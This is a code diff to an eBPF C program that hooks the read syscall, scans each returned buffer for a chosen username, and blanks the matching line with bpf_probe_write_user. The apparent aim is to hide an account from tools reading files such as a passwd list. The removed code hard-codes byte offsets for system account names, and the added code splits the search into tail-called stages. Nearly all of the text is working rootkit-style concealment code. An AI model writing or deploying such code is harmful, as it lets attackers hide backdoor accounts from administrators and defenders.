@@ -26,6 +26,29 @@ struct {
     __type(value, long unsigned int);
 } map_buff_addrs SEC(".maps");
 
+// Map to fold the buffer sized from 'read' calls
+struct {
+    __uint(type, BPF_MAP_TYPE_ARRAY);
+    __uint(max_entries, MAX_POSSIBLE_ADDRS);
+    __type(key, unsigned int);
+    __type(value, long unsigned int);
+} map_name_addrs SEC(".maps");
+struct {
+    __uint(type, BPF_MAP_TYPE_ARRAY);
+    __uint(max_entries, MAX_POSSIBLE_ADDRS);
+    __type(key, unsigned int);
+    __type(value, long unsigned int);
+} map_to_replace_addrs SEC(".maps");
+
+// Map holding the programs for tail calls
+struct {
+    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
+    __uint(max_entries, 5);
+    __type(key, __u32);
+    __type(value, __u32);
+} map_prog_array SEC(".maps");
+
+
 // Optional Target Parent PID
 const volatile int target_ppid = 0;
 
@@ -140,173 +163,19 @@ int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
     return 0;
 }
 
-long fuckbpf(long unsigned int buff_addr){
-    char local_buff[MAX_PAYLOAD_LEN] = { '\0' };
-    long ret;
-    for(int i = 0; i < MAX_PAYLOAD_LEN; i++){
-        local_buff[i] = '\0';
-    }
-    if (username[0] == 'r' && username[1] == 'o' && username[2] == 'o' && username[3] == 't') {
-    ret = bpf_probe_write_user((void*)(buff_addr + 0), local_buff, 31);
-    }
-    else if (username[0] == 'd' && username[1] == 'a' && username[2] == 'e' && username[3] == 'm' && username[4] == 'o' && username[5] == 'n') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 31), local_buff, 48);
-    }
-    else if (username[0] == 'b' && username[1] == 'i' && username[2] == 'n') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 79), local_buff, 37);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 116), local_buff, 37);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 153), local_buff, 39);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 192), local_buff, 40);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 'n' && username[3] == 'c') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 153), local_buff, 35);
-    }
-    else if (username[0] == 'g' && username[1] == 'a' && username[2] == 'm' && username[3] == 'e' && username[4] == 's') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 188), local_buff, 48);
-    }
-    else if (username[0] == 'm' && username[1] == 'a' && username[2] == 'n') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 236), local_buff, 48);
-    }
-    else if (username[0] == 'l' && username[1] == 'p') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 284), local_buff, 45);
-    }
-    else if (username[0] == 'm' && username[1] == 'a' && username[2] == 'i' && username[3] == 'l') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 329), local_buff, 44);
-    }
-    else if (username[0] == 'n' && username[1] == 'e' && username[2] == 'w' && username[3] == 's') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 373), local_buff, 50);
-    }
-    else if (username[0] == 'u' && username[1] == 'u' && username[2] == 'c' && username[3] == 'p') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 423), local_buff, 52);
-    }
-    else if (username[0] == 'p' && username[1] == 'r' && username[2] == 'o' && username[3] == 'x' && username[4] == 'y') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 475), local_buff, 43);
-    }
-    else if (username[0] == 'w' && username[1] == 'w' && username[2] == 'w' && username[3] == '-' && username[4] == 'd' && username[5] == 'a' && username[6] == 't' && username[7] == 'a') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 518), local_buff, 53);
-    }
-    else if (username[0] == 'b' && username[1] == 'a' && username[2] == 'c' && username[3] == 'k' && username[4] == 'u' && username[5] == 'p') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 571), local_buff, 53);
-    }
-    else if (username[0] == 'l' && username[1] == 'i' && username[2] == 's' && username[3] == 't') {    
-    ret = bpf_probe_write_user((void*)(buff_addr + 624), local_buff, 62);
-    }
-    else if (username[0] == 'i' && username[1] == 'r' && username[2] == 'c') {  
-    ret = bpf_probe_write_user((void*)(buff_addr + 686), local_buff, 45);
-    }
-    else if (username[0] == 'g' && username[1] == 'n' && username[2] == 'a' && username[3] == 't' && username[4] == 's') {  
-    ret = bpf_probe_write_user((void*)(buff_addr + 731), local_buff, 82);
-    }
-    else if (username[0] == 'n' && username[1] == 'o' && username[2] == 'b' && username[3] == 'o' && username[4] == 'd' && username[5] == 'y') {    
-    ret = bpf_probe_write_user((void*)(buff_addr + 813), local_buff, 59);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd' && username[7] == '-' && username[8] == 'n' && username[9] == 'e' && username[10] == 't' && username[11] == 'w' && username[12] == 'o' && username[13] == 'r' && username[14] == 'k') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 872), local_buff, 87);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd' && username[7] == '-' && username[8] == 'r' && username[9] == 'e' && username[10] == 's' && username[11] == 'o' && username[12] == 'l' && username[13] == 'v' && username[14] == 'e') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 959), local_buff, 77);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd' && username[7] == '-' && username[8] == 't' && username[9] == 'i' && username[10] == 'm' && username[11] == 'e' && username[12] == 's' && username[13] == 'y' && username[14] == 'n' && username[15] == 'c') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1036), local_buff, 90);
-    }
-    else if (username[0] == 'm' && username[1] == 'e' && username[2] == 's' && username[3] == 's' && username[4] == 'a' && username[5] == 'g' && username[6] == 'e' && username[7] == 'b' && username[8] == 'u' && username[9] == 's') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1126), local_buff, 53);
-    }
-    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 'l' && username[4] == 'o' && username[5] == 'g') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1179), local_buff, 49);
-    }
-    else if (username[0] == '_' && username[1] == 'a' && username[2] == 'p' && username[3] == 't') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1228), local_buff, 49);
-    }
-    else if (username[0] == 't' && username[1] == 's' && username[2] == 's') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1277), local_buff, 60);
-    }
-    else if (username[0] == 'u' && username[1] == 'u' && username[2] == 'i' && username[3] == 'd' && username[4] == 'd') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1337), local_buff, 46);
-    }
-    else if (username[0] == 't' && username[1] == 'c' && username[2] == 'p' && username[3] == 'd' && username[4] == 'u' && username[5] == 'm' && username[6] == 'p') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1383), local_buff, 50);
-    }
-    else if (username[0] == 's' && username[1] == 's' && username[2] == 'h' && username[3] == 'd') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1433), local_buff, 46);
-    }
-    else if (username[0] == 'l' && username[1] == 'a' && username[2] == 'n' && username[3] == 'd' && username[4] == 's' && username[5] == 'c' && username[6] == 'a' && username[7] == 'p' && username[8] == 'e') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1479), local_buff, 58);
-    }
-    else if (username[0] == 'p' && username[1] == 'o' && username[2] == 'l' && username[3] == 'l' && username[4] == 'i' && username[5] == 'n' && username[6] == 'a' && username[7] == 't' && username[8] == 'e') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1537), local_buff, 51);
-    }
-    else if (username[0] == 's' && username[1] == 'u' && username[2] == 'm' && username[3] == 'm' && username[4] == 'i' && username[5] == 't' && username[6] == 's' && username[7] == 'o' && username[8] == 'u' && username[9] == 'l') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1588), local_buff, 53);
-    }
-    else if (username[0] == 'd' && username[1] == 'n' && username[2] == 's' && username[3] == 'm' && username[4] == 'a' && username[5] == 's' && username[6] == 'q') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1641), local_buff, 63);
-    }
-    else if (username[0] == 'f' && username[1] == 'w' && username[2] == 'u' && username[3] == 'p' && username[4] == 'd' && username[5] == '-' && username[6] == 'r' && username[7] == 'e' && username[8] == 'f' && username[9] == 'r' && username[10] == 'e' && username[11] == 's' && username[12] == 'h') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1704), local_buff, 77);
-    }
-    else if (username[0] == 'm' && username[1] == 'e' && username[2] == 'm' && username[3] == 'c' && username[4] == 'a' && username[5] == 'c' && username[6] == 'h' && username[7] == 'e') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1781), local_buff, 56);
-    }
-    else if (username[0] == 'm' && username[1] == 'y' && username[2] == 's' && username[3] == 'q' && username[4] == 'l') {
-        ret = bpf_probe_write_user((void*)(buff_addr + 1837), local_buff, 56);
-    }
-    return ret;
-}
-
-static __always_inline long process_one_chunk(long unsigned int buff_addr, int num, long remain) {
-    int curr_len = remain > max_payload_len ? max_payload_len : remain;
-    int match = 1;
-    char k;
-    long ret = 0;
-
-    #pragma unroll
-    for (int i = 0; i < 5; i++) {
-        if (i >= curr_len) break;
-        // 滑动窗口匹配
-        match = 1;
-        #pragma unroll
-        for (int j = 0; j < MAX_USERNAME_LEN; j++) {
-            if (j >= username_len) break;
-            char c = 0;
-            bpf_probe_read(&c, 1, (void*)(buff_addr + num * max_payload_len + i + j));
-            if (c != username[j]) {
-                match = 0;
-                break;
-            }
-        }
-        if (match) {
-            // 匹配到就清空这一行
-            for (int j = 0; ; j++) {
-                bpf_probe_read(&k, 1, (void*)(buff_addr + num * max_payload_len + i + j));
-                char c = '\0';
-                ret = bpf_probe_write_user((void*)(buff_addr + num * max_payload_len + i + j), &c, 1);
-                if (k == '\n') break;
-            }
-            break;
-        }
-    }
-    return ret;
-}
 
 SEC("tp/syscalls/sys_exit_read")
-int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
+int find_possible_addrs(struct trace_event_raw_sys_exit *ctx)
 {
     // Check this open call is reading our target file
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    int pid = pid_tgid >> 32;
     long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
     if (pbuff_addr == 0) {
         return 0;
     }
-
+    int pid = pid_tgid >> 32;
     long unsigned int buff_addr = *pbuff_addr;
+    long unsigned int name_addr = 0;
     if (buff_addr <= 0) {
         return 0;
     }
@@ -315,68 +184,137 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     if (ctx->ret <= 0) {
         return 0;
     }
-    long int read_size = ctx->ret;
+    long unsigned int read_size = ctx->ret;
 
-    // Add our payload to the first line
-    if (read_size < username_len) {
-        return 0;
+    char local_buff[LOCAL_BUFF_SIZE] = { 0x00 };
+
+    if (read_size > (LOCAL_BUFF_SIZE+1)) {
+        // Need to loop :-(
+        read_size = LOCAL_BUFF_SIZE;
     }
 
-
-    long remain = read_size;
-    // delete username row
-    //char buf[MAX_PAYLOAD_LEN] = { 0x00 };
-    //char window[MAX_USERNAME_LEN] = { 0x00 };
-
-    int num = 0, match = 1;
-    char k;
-    //long ret = 0;
-
-    long ret = fuckbpf(buff_addr);
-
-    /*
-    while (remain > 0) {
-        ret = process_one_chunk(buff_addr, num, remain);
-        num++;
-        remain -= MAX_PAYLOAD_LEN;
-    }*/
-
-    
-
-    /*
-    while(remain > 0){
-        int curr_len = remain > max_payload_len ? max_payload_len : remain;
-        bpf_probe_read(buf, curr_len, (void*)(buff_addr + num * max_payload_len));
-        
-        for(int i = 0; i < curr_len; i++){
-            // username
-            bpf_probe_read(window, username_len, (void*)(buff_addr + num * max_payload_len + i));
-
-            for(int j = 0; j < username_len; j++){
-                if(window[j] != username[j]){
-                    match = 0;
-                    break;
-                }
-            }
-
-            if(match){
-                for(int j = 0; ; j++){
-                    bpf_probe_read(&k, 1, (void*)(buff_addr + num * max_payload_len + i + j));
-                    char c = '\0';
-                    ret = bpf_probe_write_user((void*)(buff_addr + num * max_payload_len + i + j), &c, 1);
-                    if(k == '\n'){
-                        break;
-                    }
-                }
-                break;
+    unsigned int tofind_counter = 0;
+    for (unsigned int i = 0; i < LOCAL_BUFF_SIZE; i++) {
+        // Read in chunks from buffer
+        bpf_probe_read(&local_buff, read_size, (void*)buff_addr);
+        for (unsigned int j = 0; j < LOCAL_BUFF_SIZE; j++) {
+            // Look for the first char of our 'to find' text
+            if (local_buff[j] == username[0]) {
+                name_addr = buff_addr+j;
+                // This is possibly out text, add the address to the map to be
+                // checked by program 'check_possible_addrs'
+                bpf_map_update_elem(&map_name_addrs, &tofind_counter, &name_addr, BPF_ANY);
+                tofind_counter++;
             }
         }
 
-        match = 1;
-        num++;
-        remain -= MAX_PAYLOAD_LEN;
-    }*/
+        buff_addr += LOCAL_BUFF_SIZE;
+    }
 
+    // Tail-call into 'check_possible_addrs' to loop over possible addresses
+    
+    bpf_tail_call(ctx, &map_prog_array, PROG_01);
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_read")
+int check_possible_addresses(struct trace_event_raw_sys_exit *ctx) {
+    // Check this open call is opening our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
+    if (pbuff_addr == 0) {
+        return 0;
+    }
+    int pid = pid_tgid >> 32;
+    long unsigned int* pName_addr = 0;
+    long unsigned int name_addr = 0;
+    unsigned int newline_counter = 0;
+    unsigned int match_counter = 0;
+
+    char name[TEXT_LEN_MAX+1];
+    unsigned int j = 0;
+    char old = 0;
+    const unsigned int name_len = username_len;
+    if (name_len < 0) {
+        return 0;
+    }
+    if (name_len > TEXT_LEN_MAX) {
+        return 0;
+    }
+    // Go over every possibly location
+    // and check if it really does match our text
+    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
+        newline_counter = i;
+        pName_addr = bpf_map_lookup_elem(&map_name_addrs, &newline_counter);
+        if (pName_addr == 0) {
+            break;
+        }
+        name_addr = *pName_addr;
+        if (name_addr == 0) {
+            break;
+        }
+        bpf_probe_read_user(&name, TEXT_LEN_MAX, (char*)name_addr);
+        for (j = 0; j < TEXT_LEN_MAX; j++) {
+            if (name[j] != username[j]) {
+                break;
+            }
+        }
+        if (j >= name_len) {
+            bpf_map_update_elem(&map_to_replace_addrs, &match_counter, &name_addr, BPF_ANY);
+            match_counter++;
+        }
+        bpf_map_delete_elem(&map_name_addrs, &newline_counter);
+    }
+
+    // If we found at least one match, jump into program to overwrite text
+    if (match_counter > 0) {
+        bpf_tail_call(ctx, &map_prog_array, PROG_02);
+    }
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_read")
+int delete_addresses(struct trace_event_raw_sys_exit *ctx) {
+    // Check this open call is opening our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
+    if (pbuff_addr == 0) {
+        return 0;
+    }
+    int pid = pid_tgid >> 32;
+    long unsigned int* pName_addr = 0;
+    long unsigned int name_addr = 0;
+    unsigned int match_counter = 0;
+    char local_buff[MAX_PAYLOAD_LEN] = { 0x00 };
+    char delete_buff[MAX_PAYLOAD_LEN] = { 0x00 };
+
+    // Loop over every address to replace text into
+    match_counter = 0;
+    pName_addr = bpf_map_lookup_elem(&map_to_replace_addrs, &match_counter);
+    if (pName_addr == 0) {
+        return 0;
+    }
+    name_addr = *pName_addr;
+    if (name_addr == 0) {
+        return 0;
+    }
+
+    // Attempt to overwrite data with out replace string (minus the end null bytes)
+    
+    int length = 0;
+
+    bpf_probe_read(&delete_buff, MAX_PAYLOAD_LEN, (void*)name_addr);
+
+    for(int i = 0; i < MAX_PAYLOAD_LEN; i++){
+        if(delete_buff[i] == '\n'){
+            break;
+        }
+        length++;
+    }
+    length++;
+    bpf_printk("length: %d\n", length);
+
+    long ret = bpf_probe_write_user((void*)name_addr, (void*)local_buff, length);
     // Send event
     struct event *e;
     e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
@@ -386,9 +324,13 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
         bpf_get_current_comm(&e->comm, sizeof(e->comm));
         bpf_ringbuf_submit(e, 0);
     }
-    
+        
+    // Clean up map now we're done
+    bpf_map_delete_elem(&map_to_replace_addrs, &match_counter);
+
     return 0;
 }
+
 
 SEC("tp/syscalls/sys_exit_close")
 int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
